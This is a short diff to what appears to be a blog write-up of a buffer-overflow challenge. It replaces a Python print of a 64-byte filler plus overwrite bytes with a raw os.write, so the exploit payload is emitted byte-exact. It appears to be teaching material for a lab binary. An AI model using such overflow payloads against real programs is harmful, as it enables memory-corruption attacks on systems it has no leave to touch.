@@ -226,7 +226,9 @@ Here follows a `python3` script to create the exploit:
 
 {% highlight python %}
 #!/usr/bin/env python3
-print("X"*64+"\x0a\x09\x0a\x0d")
+import os
+
+os.write(1, b'\x58'*64 + b'\x0a\x09\x0a\x0d')
 {% endhighlight %}
 
 {% highlight shell %}
